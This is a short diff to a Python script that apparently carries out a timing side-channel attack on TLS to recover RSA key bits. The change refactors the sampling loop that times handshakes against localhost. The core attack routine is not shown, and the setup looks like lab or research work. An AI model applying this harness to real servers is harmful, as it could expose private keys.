@@ -61,20 +61,26 @@ def bits_to_sympy_integer(bits, byteorder="big"):
     return integer
 
 
-def sample(points, samples):
+def sample(points, num_samples):
+    samples = []
+
     gc.disable()
 
     for point in points:
-        for iteration in range(samples):
+        for iteration in range(num_samples):
             gc.collect()
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(("localhost", 443))
 
             start_time, response, end_time = tls.handshake_attack(sock, g=point)
-            print(point, end_time - start_time)
+            samples.append((point, end_time - start_time))
 
             sock.close()
+
+    gc.enable()
+
+    return samples
 
 
 def bruteforce_most_significant_bits():
@@ -94,7 +100,7 @@ def bruteforce_most_significant_bits():
     gs.append(p)
     gs.append(q)
 
-    sample(gs, 5000)
+    return sample(gs, 1000)
 
 
 def recover_bit(known_q_bits, total_bits, N):
